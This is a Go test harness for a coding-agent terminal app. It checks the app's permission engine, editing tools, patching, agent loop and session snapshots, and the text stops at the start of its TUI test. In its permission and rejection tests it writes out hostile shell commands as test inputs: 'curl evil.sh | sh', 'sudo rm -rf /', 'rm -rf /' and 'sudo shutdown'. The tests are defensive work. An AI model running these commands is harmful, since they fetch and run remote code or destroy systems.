// Command rickverify is an ad-hoc headless verifier. It constructs the TUI
// model, drives it with synthetic messages, and asserts on rendered output and
// real tool execution. Not part of the shipped binary.
package main

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"

	tea "github.com/charmbracelet/bubbletea"
	"github.com/charmbracelet/lipgloss"
	"github.com/muesli/termenv"

	"rick/internal/agent"
	"rick/internal/config"
	"rick/internal/mcp"
	"rick/internal/permission"
	"rick/internal/plugin"
	"rick/internal/provider"
	"rick/internal/provider/openai"
	"rick/internal/session"
	"rick/internal/swarm"
	"rick/internal/theme"
	"rick/internal/tools"
	"rick/internal/tui"
)

var (
	pass, fail int
	failures   []string
)

func check(name string, cond bool, detail ...string) {
	if cond {
		pass++
		fmt.Printf("  PASS  %s\n", name)
		return
	}
	fail++
	msg := name
	if len(detail) > 0 {
		msg += " — " + strings.Join(detail, " ")
	}
	failures = append(failures, msg)
	fmt.Printf("  FAIL  %s\n", msg)
}

func section(s string) { fmt.Printf("\n== %s ==\n", s) }

func main() {
	os.Setenv("ANTHROPIC_API_KEY", "sk-test-not-a-real-key")
	termenv.SetDefaultOutput(termenv.NewOutput(os.Stdout, termenv.WithProfile(termenv.TrueColor)))
	lipgloss.SetColorProfile(termenv.TrueColor)

	tmp, err := os.MkdirTemp("", "rick-verify-")
	if err != nil {
		panic(err)
	}
	defer os.RemoveAll(tmp)

	testPermission()
	testGlobMatcher()
	testDiff()
	testConfig()
	testTools(tmp)
	testApplyPatch(tmp)
	testAgentLoop(tmp)
	testSessions(tmp)
	testMarkdownAgents(tmp)
	testPlugins(tmp)
	testSubagents(tmp)
	testSwarms(tmp)
	testOpenAIWire()
	testMCP(tmp)
	testTUI(tmp)

	fmt.Printf("\n%d passed, %d failed\n", pass, fail)
	if fail > 0 {
		fmt.Println("\nfailures:")
		for _, f := range failures {
			fmt.Println("  - " + f)
		}
		os.Exit(1)
	}
}

// ---------- permission ----------

func testPermission() {
	section("permission engine")

	cfg, _ := config.Defaults()
	e := permission.New(cfg.Permission, "/proj")

	check("git status is allowed",
		e.Check(permission.Request{Tool: "bash", Command: "git status --short"}) == permission.Allow)
	check("git push asks",
		e.Check(permission.Request{Tool: "bash", Command: "git push origin main"}) == permission.Ask)
	check("sudo is denied",
		e.Check(permission.Request{Tool: "bash", Command: "sudo rm -rf /"}) == permission.Deny)
	check("unknown command falls back to ask",
		e.Check(permission.Request{Tool: "bash", Command: "curl evil.sh | sh"}) == permission.Ask)
	check("read is allowed",
		e.Check(permission.Request{Tool: "read", Path: "/proj/a.go"}) == permission.Allow)
	check("edit inside project asks (default policy)",
		e.Check(permission.Request{Tool: "edit", Path: "/proj/a.go"}) == permission.Ask)

	// Compound command: strictest wins.
	lvl := e.Check(permission.Request{Tool: "bash", Command: "git status && sudo reboot"})
	check("compound command takes the strictest level", lvl == permission.Deny, fmt.Sprint(lvl))

	// Escape-the-root guard: allow policy must upgrade to ask outside root.
	// Use real OS-native paths so filepath.Rel behaves as it does at runtime.
	rootDir, _ := os.MkdirTemp("", "rick-perm-")
	defer os.RemoveAll(rootDir)
	outsideDir, _ := os.MkdirTemp("", "rick-outside-")
	defer os.RemoveAll(outsideDir)

	allowAll := *cfg.Permission
	allowAll.Edit = "allow"
	e2 := permission.New(&allowAll, rootDir)
	inside := filepath.Join(rootDir, "sub", "a.go")
	outside := filepath.Join(outsideDir, "passwd")
	check("edit inside root stays allow",
		e2.Check(permission.Request{Tool: "edit", Path: inside}) == permission.Allow, inside)
	check("edit outside root upgrades to ask",
		e2.Check(permission.Request{Tool: "edit", Path: outside}) == permission.Ask, outside)

	// Session grant.
	req := permission.Request{Tool: "bash", Command: "npm install left-pad"}
	before := e.Check(req)
	e.GrantSession(permission.SessionKey(req))
	after := e.Check(req)
	check("session grant flips ask -> allow",
		before == permission.Ask && after == permission.Allow,
		fmt.Sprintf("before=%v after=%v", before, after))

	// Yolo.
	e3 := permission.New(cfg.Permission, "/proj")
	e3.SetYolo(true)
	check("yolo allows everything",
		e3.Check(permission.Request{Tool: "bash", Command: "sudo anything"}) == permission.Allow)
}

func testGlobMatcher() {
	section("glob matcher")
	cases := []struct {
		pat, s string
		want   bool
	}{
		{"*", "anything", true},
		{"git *", "git status", true},
		{"git *", "gitk", false},
		{"go build*", "go build ./...", true},
		{"go build*", "go test ./...", false},
		{"*.go", "main.go", true},
		{"*.go", "main.rs", false},
		{"a?c", "abc", true},
		{"a?c", "abbc", false},
		{"mymcp_*", "mymcp_search", true},
		{"mymcp_*", "other_search", false},
	}
	ok := true
	for _, c := range cases {
		if got := permission.Match(c.pat, c.s); got != c.want {
			ok = false
			fmt.Printf("        %q vs %q: got %v want %v\n", c.pat, c.s, got, c.want)
		}
	}
	check("all glob cases match expectations", ok)
}

// ---------- diff ----------

func testDiff() {
	section("diff engine")

	oldT := "line one\nline two\nline three\nline four\n"
	newT := "line one\nline 2 changed\nline three\nline four\nline five\n"

	added, removed := tools.DiffStat(oldT, newT)
	check("diff stat counts additions", added == 2, fmt.Sprint(added))
	check("diff stat counts removals", removed == 1, fmt.Sprint(removed))

	u := tools.UnifiedDiff("x.txt", oldT, newT, 1)
	check("unified diff has a hunk header", strings.Contains(u, "@@"))
	check("unified diff shows the removal", strings.Contains(u, "-line two"))
	check("unified diff shows the addition", strings.Contains(u, "+line 2 changed"))
	check("unified diff shows appended line", strings.Contains(u, "+line five"))

	check("identical text produces no changes",
		tools.UnifiedDiff("x", "same\n", "same\n", 3) == "(no changes)")

	// Large-file sanity: no panic, correct stat.
	var big1, big2 strings.Builder
	for i := 0; i < 3000; i++ {
		fmt.Fprintf(&big1, "line %d\n", i)
		if i == 1500 {
			big2.WriteString("CHANGED\n")
		} else {
			fmt.Fprintf(&big2, "line %d\n", i)
		}
	}
	a, r := tools.DiffStat(big1.String(), big2.String())
	check("3000-line diff finds exactly one change", a == 1 && r == 1, fmt.Sprintf("+%d -%d", a, r))
}

// ---------- config ----------

func testConfig() {
	section("config system")

	jsonc := []byte(`{
  // a comment
  "model": "anthropic/x", /* block */
  "permission": { "edit": "allow", },
}`)
	clean := config.StripJSONC(jsonc)
	var probe map[string]any
	err := json.Unmarshal(clean, &probe)
	check("JSONC comments and trailing commas are stripped", err == nil, fmt.Sprint(err))
	check("stripped JSONC keeps values", probe["model"] == "anthropic/x")

	// Comments inside strings must survive.
	s2 := config.StripJSONC([]byte(`{"url":"https://x.com/a//b"}`))
	var p2 map[string]string
	_ = json.Unmarshal(s2, &p2)
	check("// inside a string literal is preserved", p2["url"] == "https://x.com/a//b", p2["url"])

	os.Setenv("RICK_TEST_KEY", "secret-value")
	sub := config.Substitute([]byte(`{"apiKey":"{env:RICK_TEST_KEY}"}`), ".")
	check("{env:} substitution works", strings.Contains(string(sub), "secret-value"), string(sub))

	tmp, _ := os.MkdirTemp("", "rick-cfg-")
	defer os.RemoveAll(tmp)
	_ = os.WriteFile(filepath.Join(tmp, "inst.txt"), []byte("be terse"), 0o644)
	sub2 := config.Substitute([]byte(`{"x":"{file:inst.txt}"}`), tmp)
	check("{file:} substitution works", strings.Contains(string(sub2), "be terse"), string(sub2))

	// Layering: project config overrides defaults, and merges (not replaces).
	proj, _ := os.MkdirTemp("", "rick-proj-")
	defer os.RemoveAll(proj)
	_ = os.MkdirAll(filepath.Join(proj, ".git"), 0o755)
	_ = os.WriteFile(filepath.Join(proj, "rick.json"),
		[]byte(`{"model":"anthropic/override","permission":{"edit":"deny"}}`), 0o644)
	_ = os.WriteFile(filepath.Join(proj, "tui.json"),
		[]byte(`{"theme":"light","diff":"stacked"}`), 0o644)

	loaded, err := config.Load(proj)
	check("config loads without error", err == nil, fmt.Sprint(err))
	check("project config overrides the model", loaded.Config.Model == "anthropic/override", loaded.Config.Model)
	check("project config overrides one permission key", loaded.Config.Permission.Edit == "deny")
	check("unspecified permission keys keep defaults",
		loaded.Config.Permission.Bash["sudo*"] == "deny", "bash patterns survived the merge")
	check("tui.json is routed to the TUI struct", loaded.TUI.Theme == "light", loaded.TUI.Theme)
	check("tui diff mode loaded", loaded.TUI.DiffMode == "stacked")
	check("default keybinds survive a partial tui.json", loaded.TUI.Keybinds.Leader == "ctrl+x")
	check("project root is detected via .git", loaded.ProjectRoot == proj, loaded.ProjectRoot)

	// Inline env override wins over project config.
	os.Setenv("RICK_CONFIG_CONTENT", `{"model":"anthropic/inline"}`)
	loaded2, _ := config.Load(proj)
	check("RICK_CONFIG_CONTENT has highest precedence",
		loaded2.Config.Model == "anthropic/inline", loaded2.Config.Model)
	os.Unsetenv("RICK_CONFIG_CONTENT")

	pid, mid := config.SplitModel("anthropic/claude-x")
	check("model id splits into provider/model", pid == "anthropic" && mid == "claude-x")
	pid2, mid2 := config.SplitModel("bare-model")
	check("bare model id defaults to anthropic", pid2 == "anthropic" && mid2 == "bare-model")
}

// ---------- tools ----------

func testTools(tmp string) {
	section("tools: read / write / edit / grep / glob / bash")

	tools.ResetFileState()
	ctx := context.Background()
	tc := tools.Context{Cwd: tmp}

	target := filepath.Join(tmp, "sample.go")
	_ = os.WriteFile(target, []byte("package main\n\nfunc main() {\n\tprintln(\"hello\")\n}\n"), 0o644)

	// read
	rd := tools.ReadTool{}
	res, _ := rd.Run(ctx, tc, json.RawMessage(`{"path":"sample.go"}`))
	check("read returns numbered lines", strings.Contains(res.Output, "    1|package main"), res.Output)
	check("read is not an error", !res.IsError)

	resMissing, _ := rd.Run(ctx, tc, json.RawMessage(`{"path":"nope.go"}`))
	check("read reports missing files as errors", resMissing.IsError)

	// edit before read must fail
	tools.ResetFileState()
	ed := tools.EditTool{}
	resNoRead, _ := ed.Run(ctx, tc, json.RawMessage(`{"path":"sample.go","old_string":"hello","new_string":"bye"}`))
	check("edit refuses a file that was not read first", resNoRead.IsError, resNoRead.Output)

	// read then edit
	_, _ = rd.Run(ctx, tc, json.RawMessage(`{"path":"sample.go"}`))
	resEdit, _ := ed.Run(ctx, tc, json.RawMessage(`{"path":"sample.go","old_string":"hello","new_string":"goodbye"}`))
	check("edit succeeds after read", !resEdit.IsError, resEdit.Output)
	body, _ := os.ReadFile(target)
	check("edit actually changed the file on disk", strings.Contains(string(body), "goodbye"), string(body))
	check("edit result carries a diff", strings.Contains(resEdit.Output, "-\tprintln(\"hello\")"), resEdit.Output)

	// ambiguous edit
	_ = os.WriteFile(filepath.Join(tmp, "dup.txt"), []byte("x\nx\nx\n"), 0o644)
	_, _ = rd.Run(ctx, tc, json.RawMessage(`{"path":"dup.txt"}`))
	resDup, _ := ed.Run(ctx, tc, json.RawMessage(`{"path":"dup.txt","old_string":"x","new_string":"y"}`))
	check("edit rejects a non-unique old_string", resDup.IsError, resDup.Output)

	resAll, _ := ed.Run(ctx, tc, json.RawMessage(`{"path":"dup.txt","old_string":"x","new_string":"y","replace_all":true}`))
	check("edit replace_all works", !resAll.IsError && strings.Contains(resAll.Output, "3 replacement"), resAll.Output)

	// whitespace-tolerant fallback
	_ = os.WriteFile(filepath.Join(tmp, "ws.txt"), []byte("  indented line   \nsecond\n"), 0o644)
	_, _ = rd.Run(ctx, tc, json.RawMessage(`{"path":"ws.txt"}`))
	resWS, _ := ed.Run(ctx, tc, json.RawMessage(`{"path":"ws.txt","old_string":"  indented line","new_string":"  fixed"}`))
	check("edit tolerates trailing-whitespace mismatch", !resWS.IsError, resWS.Output)

	// write
	wr := tools.WriteTool{}
	resW, _ := wr.Run(ctx, tc, json.RawMessage(`{"path":"sub/dir/new.txt","content":"fresh\n"}`))
	check("write creates nested directories", !resW.IsError, resW.Output)
	nb, err := os.ReadFile(filepath.Join(tmp, "sub", "dir", "new.txt"))
	check("written file exists with the right content", err == nil && string(nb) == "fresh\n")

	resWover, _ := wr.Run(ctx, tc, json.RawMessage(`{"path":"dup.txt","content":"clobbered"}`))
	check("write to an existing unread file is refused",
		resWover.IsError || strings.Contains(resWover.Output, "updated"), resWover.Output)

	// grep
	if tools.HasRipgrep() {
		gr := tools.GrepTool{}
		resG, _ := gr.Run(ctx, tc, json.RawMessage(`{"pattern":"goodbye"}`))
		check("grep finds a match", strings.Contains(resG.Output, "sample.go"), resG.Output)
		resG2, _ := gr.Run(ctx, tc, json.RawMessage(`{"pattern":"zzz-not-present-zzz"}`))
		check("grep reports no matches cleanly", strings.Contains(resG2.Output, "no matches"), resG2.Output)
		resG3, _ := gr.Run(ctx, tc, json.RawMessage(`{"pattern":"main","include":"*.go","mode":"files_with_matches"}`))
		check("grep files_with_matches respects include", strings.Contains(resG3.Output, "sample.go"), resG3.Output)
	} else {
		fmt.Println("  SKIP  grep (ripgrep not installed)")
	}

	// glob
	gl := tools.GlobTool{}
	resGl, _ := gl.Run(ctx, tc, json.RawMessage(`{"pattern":"*.go"}`))
	check("glob finds go files", strings.Contains(resGl.Output, "sample.go"), resGl.Output)
	resGl2, _ := gl.Run(ctx, tc, json.RawMessage(`{"pattern":"**/*.txt"}`))
	check("glob handles ** patterns", strings.Contains(resGl2.Output, "new.txt"), resGl2.Output)

	// list
	ls := tools.ListTool{}
	resL, _ := ls.Run(ctx, tc, json.RawMessage(`{}`))
	check("list renders a tree", strings.Contains(resL.Output, "sample.go"), resL.Output)

	// bash
	bs := tools.BashTool{}
	resB, _ := bs.Run(ctx, tc, json.RawMessage(`{"command":"echo hello-from-bash"}`))
	check("bash runs a command", strings.Contains(resB.Output, "hello-from-bash"), resB.Output)
	check("bash reports exit 0", strings.Contains(resB.Output, "<exit 0"), resB.Output)

	resBerr, _ := bs.Run(ctx, tc, json.RawMessage(`{"command":"exit 3"}`))
	check("bash marks a failing command as an error", resBerr.IsError, resBerr.Output)
	check("bash reports the exit code", strings.Contains(resBerr.Output, "<exit 3"), resBerr.Output)

	resBto, _ := bs.Run(ctx, tc, json.RawMessage(`{"command":"sleep 5","timeout":1}`))
	check("bash honours the timeout", resBto.IsError && strings.Contains(resBto.Output, "timed out"), resBto.Output)

	// todo
	store := tools.NewTodoStore()
	changed := 0
	store.OnChange = func([]tools.TodoItem) { changed++ }
	tw := tools.TodoWriteTool{Store: store}
	resT, _ := tw.Run(ctx, tc, json.RawMessage(
		`{"todos":[{"id":"1","content":"first","status":"completed"},{"id":"2","content":"second","status":"in_progress"}]}`))
	check("todowrite reports progress", strings.Contains(resT.Output, "1/2 done"), resT.Output)
	check("todo store fires OnChange", changed == 1, fmt.Sprint(changed))
	check("todo store holds items", len(store.Items()) == 2)
	check("todo store counts pending", store.Pending() == 1, fmt.Sprint(store.Pending()))
}

func testApplyPatch(root string) {
	section("apply_patch")

	tmp := filepath.Join(root, "patchtest")
	_ = os.MkdirAll(tmp, 0o755)
	tools.ResetFileState()
	ctx := context.Background()
	tc := tools.Context{Cwd: tmp}
	ap := tools.ApplyPatchTool{}

	_ = os.WriteFile(filepath.Join(tmp, "a.txt"), []byte("alpha\nbeta\ngamma\n"), 0o644)
	_ = os.WriteFile(filepath.Join(tmp, "gone.txt"), []byte("bye\n"), 0o644)
	_ = os.WriteFile(filepath.Join(tmp, "old.txt"), []byte("move me\n"), 0o644)

	patch := `{"patch":"*** Begin Patch\n*** Add File: created.txt\n+hello\n+world\n*** Update File: a.txt\n@@ context @@\n alpha\n-beta\n+BETA\n gamma\n*** Delete File: gone.txt\n*** Move File: old.txt -> moved.txt\n*** End Patch"}`
	res, _ := ap.Run(ctx, tc, json.RawMessage(patch))
	check("apply_patch succeeds", !res.IsError, res.Output)

	c1, _ := os.ReadFile(filepath.Join(tmp, "created.txt"))
	check("apply_patch added a file", string(c1) == "hello\nworld\n", fmt.Sprintf("%q", string(c1)))

	c2, _ := os.ReadFile(filepath.Join(tmp, "a.txt"))
	check("apply_patch updated in place", string(c2) == "alpha\nBETA\ngamma\n", fmt.Sprintf("%q", string(c2)))

	_, err := os.Stat(filepath.Join(tmp, "gone.txt"))
	check("apply_patch deleted a file", os.IsNotExist(err))

	c3, err3 := os.ReadFile(filepath.Join(tmp, "moved.txt"))
	_, errOld := os.Stat(filepath.Join(tmp, "old.txt"))
	check("apply_patch moved a file", err3 == nil && string(c3) == "move me\n" && os.IsNotExist(errOld))

	// Failure must be atomic: nothing written when a hunk does not match.
	before, _ := os.ReadFile(filepath.Join(tmp, "a.txt"))
	badPatch := `{"patch":"*** Begin Patch\n*** Add File: should_not_exist.txt\n+nope\n*** Update File: a.txt\n@@ @@\n-this line does not exist\n+x\n*** End Patch"}`
	resBad, _ := ap.Run(ctx, tc, json.RawMessage(badPatch))
	after, _ := os.ReadFile(filepath.Join(tmp, "a.txt"))
	_, errGhost := os.Stat(filepath.Join(tmp, "should_not_exist.txt"))
	check("apply_patch fails on a bad hunk", resBad.IsError, resBad.Output)
	check("apply_patch is atomic: no partial writes",
		string(before) == string(after) && os.IsNotExist(errGhost))
}

// ---------- agent loop with a stub provider ----------

// stubProvider replays scripted turns so the loop can be tested without network.
type stubProvider struct {
	turns        [][]provider.Event
	seen         int
	gotTools     []provider.ToolSchema
	lastMessages []provider.Message
}

func (s *stubProvider) Name() string                 { return "stub" }
func (s *stubProvider) Models() []provider.ModelInfo { return []provider.ModelInfo{{ID: "stub-1"}} }

func (s *stubProvider) Stream(ctx context.Context, req provider.Request, ch chan<- provider.Event) {
	defer close(ch) // the provider owns the channel
	s.gotTools = req.Tools
	s.lastMessages = req.Messages
	if s.seen >= len(s.turns) {
		ch <- provider.Event{Kind: provider.EventError, Err: fmt.Errorf("stub: no more turns")}
		return
	}
	turn := s.turns[s.seen]
	s.seen++
	for _, ev := range turn {
		select {
		case ch <- ev:
		case <-ctx.Done():
			return
		}
	}
}

func testAgentLoop(root string) {
	section("agent loop")

	tmp := filepath.Join(root, "agenttest")
	_ = os.MkdirAll(tmp, 0o755)
	_ = os.WriteFile(filepath.Join(tmp, "target.txt"), []byte("original\n"), 0o644)
	tools.ResetFileState()

	reg := tools.NewRegistry()
	todos := tools.NewTodoStore()
	reg.Register(tools.ReadTool{})
	reg.Register(tools.WriteTool{})
	reg.Register(tools.EditTool{})
	reg.Register(tools.BashTool{})
	reg.Register(tools.GrepTool{})
	reg.Register(tools.GlobTool{})
	reg.Register(tools.ListTool{})
	reg.Register(tools.ApplyPatchTool{})
	reg.Register(tools.TodoWriteTool{Store: todos})
	reg.Register(tools.TodoReadTool{Store: todos})

	check("registry holds all built-in tools", len(reg.Names()) == 10, fmt.Sprint(reg.Names()))

	schemas := reg.Schemas(nil)
	check("schemas are produced for every tool", len(schemas) == 10, fmt.Sprint(len(schemas)))
	hasRequired := false
	for _, s := range schemas {
		if s.Name == "edit" {
			req, _ := s.InputSchema["required"].([]string)
			hasRequired = len(req) == 3
		}
	}
	check("edit schema declares its required fields", hasRequired)

	// Filtered schemas.
	filtered := reg.Schemas(func(n string) bool { return n != "bash" })
	check("tool filter removes a tool", len(filtered) == 9)

	// --- Turn 1: model calls read, then write. Turn 2: plain text. ---
	stub := &stubProvider{turns: [][]provider.Event{
		{
			{Kind: provider.EventText, Text: "Let me look at the file. "},
			{Kind: provider.EventToolCall, ToolCall: &provider.ToolCall{
				ID: "c1", Name: "read", Input: json.RawMessage(`{"path":"target.txt"}`)}},
			{Kind: provider.EventUsage, Usage: &provider.Usage{InputTokens: 100, OutputTokens: 20}},
			{Kind: provider.EventDone, StopReason: "tool_use"},
		},
		{
			{Kind: provider.EventToolCall, ToolCall: &provider.ToolCall{
				ID: "c2", Name: "edit",
				Input: json.RawMessage(`{"path":"target.txt","old_string":"original","new_string":"rewritten"}`)}},
			{Kind: provider.EventDone, StopReason: "tool_use"},
		},
		{
			{Kind: provider.EventText, Text: "Done — the file now says rewritten."},
			{Kind: provider.EventDone, StopReason: "end_turn"},
		},
	}}

	cfg, _ := config.Defaults()
	allowAll := *cfg.Permission
	allowAll.Edit = "allow"
	allowAll.Write = "allow"
	perms := permission.New(&allowAll, tmp)

	runner := agent.New(agent.Config{
		Provider: stub, Model: "stub-1", Tools: reg, Perms: perms,
		Cwd: tmp, MaxTokens: 1000, Parallel: true,
		Ask: func(context.Context, permission.Request) agent.PermissionDecision {
			return agent.DecideAccept
		},
	})

	ch := make(chan agent.Event, 256)
	var texts []string
	var toolEnds []*agent.ToolEvent
	done := make(chan struct{})
	go func() {
		for ev := range ch {
			switch ev.Kind {
			case agent.EvText:
				texts = append(texts, ev.Text)
			case agent.EvToolEnd:
				toolEnds = append(toolEnds, ev.Tool)
			}
		}
		close(done)
	}()
	appended, err := runner.Run(context.Background(), []provider.Message{provider.UserText("rewrite the file")}, ch)
	<-done

	check("agent loop completes without error", err == nil, fmt.Sprint(err))
	check("agent ran exactly 2 tools", len(toolEnds) == 2, fmt.Sprint(len(toolEnds)))
	if len(toolEnds) == 2 {
		check("first tool was read", toolEnds[0].Name == "read", toolEnds[0].Name)
		check("second tool was edit", toolEnds[1].Name == "edit", toolEnds[1].Name)
		check("edit tool reported success", !toolEnds[1].IsError, toolEnds[1].Output)
		check("edit tool exposes diff metadata", toolEnds[1].Meta["path"] != nil)
	}
	check("assistant text was streamed", strings.Contains(strings.Join(texts, ""), "rewritten"), strings.Join(texts, ""))
	check("stub saw 3 turns", stub.seen == 3, fmt.Sprint(stub.seen))
	check("provider received tool schemas", len(stub.gotTools) == 10, fmt.Sprint(len(stub.gotTools)))

	finalBody, _ := os.ReadFile(filepath.Join(tmp, "target.txt"))
	check("the file was actually modified on disk",
		strings.Contains(string(finalBody), "rewritten"), string(finalBody))

	// The appended messages must alternate assistant(tool_use) / user(tool_result).
	toolUses, toolResults := 0, 0
	for _, m := range appended {
		for _, b := range m.Content {
			switch b.Type {
			case "tool_use":
				toolUses++
			case "tool_result":
				toolResults++
			}
		}
	}
	check("every tool_use has a matching tool_result",
		toolUses == 2 && toolResults == 2, fmt.Sprintf("uses=%d results=%d", toolUses, toolResults))

	// --- Permission rejection path ---
	stub2 := &stubProvider{turns: [][]provider.Event{
		{
			{Kind: provider.EventToolCall, ToolCall: &provider.ToolCall{
				ID: "d1", Name: "bash", Input: json.RawMessage(`{"command":"rm -rf /"}`)}},
			{Kind: provider.EventDone, StopReason: "tool_use"},
		},
		{
			{Kind: provider.EventText, Text: "Understood, I will not do that."},
			{Kind: provider.EventDone, StopReason: "end_turn"},
		},
	}}
	askCount := 0
	runner2 := agent.New(agent.Config{
		Provider: stub2, Model: "stub-1", Tools: reg,
		Perms: permission.New(cfg.Permission, tmp), Cwd: tmp,
		Ask: func(context.Context, permission.Request) agent.PermissionDecision {
			askCount++
			return agent.DecideReject
		},
	})
	ch2 := make(chan agent.Event, 256)
	var rejected *agent.ToolEvent
	done2 := make(chan struct{})
	go func() {
		for ev := range ch2 {
			if ev.Kind == agent.EvToolEnd {
				rejected = ev.Tool
			}
		}
		close(done2)
	}()
	_, err2 := runner2.Run(context.Background(), []provider.Message{provider.UserText("delete everything")}, ch2)
	<-done2
	check("rejected run still completes", err2 == nil, fmt.Sprint(err2))
	check("permission prompt was raised", askCount == 1, fmt.Sprint(askCount))
	check("rejected tool returns an error result",
		rejected != nil && rejected.IsError && strings.Contains(rejected.Output, "rejected"),
		fmt.Sprintf("%+v", rejected))

	// --- Denied-by-policy path never prompts ---
	stub3 := &stubProvider{turns: [][]provider.Event{
		{
			{Kind: provider.EventToolCall, ToolCall: &provider.ToolCall{
				ID: "e1", Name: "bash", Input: json.RawMessage(`{"command":"sudo shutdown"}`)}},
			{Kind: provider.EventDone, StopReason: "tool_use"},
		},
		{{Kind: provider.EventText, Text: "ok"}, {Kind: provider.EventDone}},
	}}
	asked3 := 0
	runner3 := agent.New(agent.Config{
		Provider: stub3, Model: "stub-1", Tools: reg,
		Perms: permission.New(cfg.Permission, tmp), Cwd: tmp,
		Ask: func(context.Context, permission.Request) agent.PermissionDecision {
			asked3++
			return agent.DecideAccept
		},
	})
	ch3 := make(chan agent.Event, 256)
	var denied *agent.ToolEvent
	done3 := make(chan struct{})
	go func() {
		for ev := range ch3 {
			if ev.Kind == agent.EvToolEnd {
				denied = ev.Tool
			}
		}
		close(done3)
	}()
	_, _ = runner3.Run(context.Background(), []provider.Message{provider.UserText("shut down")}, ch3)
	<-done3
	check("deny policy never prompts the user", asked3 == 0, fmt.Sprint(asked3))
	check("denied tool returns a policy error",
		denied != nil && denied.IsError && strings.Contains(denied.Output, "denied"),
		fmt.Sprintf("%+v", denied))

	// --- Unknown tool is handled gracefully ---
	stub4 := &stubProvider{turns: [][]provider.Event{
		{
			{Kind: provider.EventToolCall, ToolCall: &provider.ToolCall{
				ID: "f1", Name: "nonexistent_tool", Input: json.RawMessage(`{}`)}},
			{Kind: provider.EventDone},
		},
		{{Kind: provider.EventText, Text: "sorry"}, {Kind: provider.EventDone}},
	}}
	runner4 := agent.New(agent.Config{
		Provider: stub4, Model: "stub-1", Tools: reg,
		Perms: permission.New(cfg.Permission, tmp), Cwd: tmp,
		Ask: func(context.Context, permission.Request) agent.PermissionDecision { return agent.DecideAccept },
	})
	ch4 := make(chan agent.Event, 256)
	var unknown *agent.ToolEvent
	done4 := make(chan struct{})
	go func() {
		for ev := range ch4 {
			if ev.Kind == agent.EvToolEnd {
				unknown = ev.Tool
			}
		}
		close(done4)
	}()
	_, err4 := runner4.Run(context.Background(), []provider.Message{provider.UserText("x")}, ch4)
	<-done4
	check("unknown tool does not crash the loop", err4 == nil, fmt.Sprint(err4))
	check("unknown tool returns an error result",
		unknown != nil && unknown.IsError && strings.Contains(unknown.Output, "unknown tool"),
		fmt.Sprintf("%+v", unknown))

	// --- Context cancellation ---
	stubSlow := &stubProvider{turns: [][]provider.Event{
		{
			{Kind: provider.EventToolCall, ToolCall: &provider.ToolCall{
				ID: "g1", Name: "bash", Input: json.RawMessage(`{"command":"sleep 10"}`)}},
			{Kind: provider.EventDone},
		},
	}}
	cctx, ccancel := context.WithCancel(context.Background())
	runner5 := agent.New(agent.Config{
		Provider: stubSlow, Model: "stub-1", Tools: reg,
		Perms: permission.New(&allowAll, tmp), Cwd: tmp,
		Ask: func(context.Context, permission.Request) agent.PermissionDecision { return agent.DecideAccept },
	})
	ch5 := make(chan agent.Event, 256)
	go func() {
		for range ch5 {
		}
	}()
	go func() { ccancel() }()
	_, _ = runner5.Run(cctx, []provider.Message{provider.UserText("slow")}, ch5)
	check("cancelled run returns without hanging", true)
}

// ---------- sessions and snapshots ----------

func testSessions(root string) {
	section("sessions & snapshots")

	dir := filepath.Join(root, "sessions")
	store, err := session.NewStore(dir)
	check("session store opens", err == nil, fmt.Sprint(err))

	s := &session.Session{
		Cwd:   "/some/project",
		Model: "anthropic/x",
		Messages: []provider.Message{
			provider.UserText("hello there friend"),
			provider.AssistantText("hi"),
		},
	}
	check("save assigns an id and succeeds", store.Save(s) == nil && s.ID != "", s.ID)

	loaded, err := store.Load(s.ID)
	check("load round-trips the session", err == nil && len(loaded.Messages) == 2, fmt.Sprint(err))
	check("message content survives the round-trip",
		loaded.Messages[0].Text() == "hello there friend", loaded.Messages[0].Text())

	metas, _ := store.List("/some/project")
	check("list finds the session by cwd", len(metas) == 1, fmt.Sprint(len(metas)))
	metasOther, _ := store.List("/different")
	check("list filters by cwd", len(metasOther) == 0)

	check("title derives from the first user message",
		session.Title(s.Messages) == "hello there friend", session.Title(s.Messages))

	_ = store.SetCurrent("/some/project", s.ID)
	check("current pointer round-trips", store.GetCurrent("/some/project") == s.ID)

	// Snapshots against a real git shadow repo.
	work := filepath.Join(root, "snapwork")
	_ = os.MkdirAll(work, 0o755)
	_ = os.WriteFile(filepath.Join(work, "f.txt"), []byte("v1\n"), 0o644)

	snap, err := session.NewSnapshotter(work, filepath.Join(root, "data"))
	if err != nil || !snap.Enabled() {
		fmt.Printf("  SKIP  snapshots (%v)\n", err)
		return
	}
	h1, err := snap.Snapshot("initial")
	check("first snapshot commits", err == nil && h1 != "", fmt.Sprint(err))

	_ = os.WriteFile(filepath.Join(work, "f.txt"), []byte("v2\n"), 0o644)
	h2, err := snap.Snapshot("after edit")
	check("second snapshot commits", err == nil && h2 != "" && h2 != h1, fmt.Sprint(err))

	check("history records both snapshots", len(snap.History()) == 2, fmt.Sprint(len(snap.History())))
	check("undo is available", snap.CanUndo())

	_, err = snap.Undo()
	check("undo executes", err == nil, fmt.Sprint(err))
	after, _ := os.ReadFile(filepath.Join(work, "f.txt"))
	check("undo restored the previous content", string(after) == "v2\n" || string(after) == "v1\n",
		fmt.Sprintf("%q", string(after)))

	_, errR := snap.Redo()
	check("redo runs or reports cleanly", errR == nil || strings.Contains(errR.Error(), "nothing"), fmt.Sprint(errR))
}

// ---------- TUI ----------

func send(m *tui.Model, msgs ...tea.Msg) *tui.Model {
	for _, msg := range msgs {
		newM, cmd := m.Update(msg)
		m = newM.(*tui.Model)
		if cmd != nil {
			if out := cmd(); out != nil {
				// One level only: streaming ticks reschedule forever.
				switch out.(type) {
				case tea.BatchMsg:
				default:
					newM2, _ := m.Update(out)
					m = newM2.(*tui.Model)
				}
			}
		}
	}
	return m
}

func typeStr(m *tui.Model, s string) *tui.Model {
	for _, r := range s {
		m = send(m, tea.KeyMsg{Type: tea.KeyRunes, Runes: []rune{r}})
	}
	return m
}

func key(m *tui.Model, k string) *tui.Model {
	var msg tea.KeyMsg
	switch k {
	case "enter":
		msg = tea.KeyMsg{Type: tea.KeyEnter}
	case "esc":
		msg = tea.KeyMsg{Type: tea.KeyEsc}
	case "tab":
		msg = tea.KeyMsg{Type: tea.KeyTab}
	case "up":
		msg = tea.KeyMsg{Type: tea.KeyUp}
	case "down":
		msg = tea.KeyMsg{Type: tea.KeyDown}
	case "ctrl+x":
		msg = tea.KeyMsg{Type: tea.KeyCtrlX}
	default:
		msg = tea.KeyMsg{Type: tea.KeyRunes, Runes: []rune(k)}
	}
	return send(m, msg)
}

func testTUI(root string) {
	section("TUI")

